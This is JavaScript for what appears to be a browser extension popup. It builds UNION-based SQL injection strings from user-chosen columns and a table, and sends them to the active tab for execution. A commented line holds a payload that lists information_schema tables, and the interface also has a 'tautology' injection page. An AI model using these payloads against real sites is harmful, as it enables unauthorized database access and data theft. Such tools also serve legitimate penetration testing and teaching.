document.addEventListener('DOMContentLoaded', function () {

  $("#form_container_union").show();
  $("#form_container_tautology").hide();



  /* Redraws injection statement preview */
  function update_preview() {
    var cols = "";
    var table = $("#union_param_6").val();
    for (var i = 0; i < 5; i++) {
      if ($("#union_param_" + (i + 1)).prop("disabled") != true) {
        if (i > 0 && i < 5) {
          cols += ", "
        }
        cols += $("#union_param_" + (i + 1)).val();
      }
    }
    $("#injection_string").html("' UNION (SELECT " + cols + " FROM " + table + "); -- ");
  }


  update_preview();

  $("#btn_inject").on("click", function () {
    chrome.tabs.query({
      active: true,
      currentWindow: true
    }, function (activeTabs) {
      chrome.tabs.sendMessage(activeTabs[0].id, {
        action: "executeCode",
        data: $("#injection_string").html()
      });
    });

    //$("#injection_string").html("' UNION (SELECT TABLE_NAME, TABLE_SCHEMA FROM information_schema.tables); -- ");
  });











  /* Begin union page */
  $("#union_param_1").on("keyup", function () {
    update_preview();
  });

  $("#union_param_2").on("keyup", function () {
    update_preview();
  });

  $("#union_param_3").on("keyup", function () {
    update_preview();
  });

  $("#union_param_4").on("keyup", function () {
    update_preview();
  });

  $("#union_param_5").on("keyup", function () {
    update_preview();
  });

  $("#union_param_6").on("keyup", function () {
    update_preview();
  });

  $("#highlighter").on("click", function (e) {
    e.preventDefault();
  });

  $("#union_column_selector").change(function () {
    switch ($("#union_column_selector").val()) {
      case "1":
        $("#union_param_1").show();
        $("#union_param_2").prop("disabled", true);
        $("#union_param_2").val("");
        $("#union_param_3").prop("disabled", true);
        $("#union_param_3").val("");
        $("#union_param_4").prop("disabled", true);
        $("#union_param_4").val("");
        $("#union_param_5").prop("disabled", true);
        $("#union_param_5").val("");
        update_preview();
        break;
      case "2":
        $("#union_param_1").show();
        $("#union_param_2").prop("disabled", false);
        $("#union_param_3").prop("disabled", true);
        $("#union_param_3").val("");
        $("#union_param_4").prop("disabled", true);
        $("#union_param_4").val("");
        $("#union_param_5").prop("disabled", true);
        $("#union_param_5").val("");
        update_preview();
        break;
      case "3":
        $("#union_param_1").show();
        $("#union_param_2").prop("disabled", false);
        $("#union_param_3").prop("disabled", false);
        $("#union_param_4").prop("disabled", true);
        $("#union_param_4").val("");
        $("#union_param_5").prop("disabled", true);
        $("#union_param_5").val("");
        update_preview();
        break;
      case "4":
        $("#union_param_1").show();
        $("#union_param_2").prop("disabled", false);
        $("#union_param_3").prop("disabled", false);
        $("#union_param_4").prop("disabled", false);
        $("#union_param_5").prop("disabled", true);
        $("#union_param_5").val("");
        update_preview();
        break;
      case "5":
        $("#union_param_1").show();
        $("#union_param_2").prop("disabled", false);
        $("#union_param_3").prop("disabled", false);
        $("#union_param_4").prop("disabled", false);
        $("#union_param_5").prop("disabled", false);
        update_preview();
        break;
      default:
    }
  });
  /* End union page */










  $("#page_1").on("click", function () {
    $("#form_container_union").show();
    $("#form_container_tautology").hide();
  });

  $("#page_2").on("click", function () {
    $("#form_container_union").hide();
    $("#form_container_tautology").show();
  });



})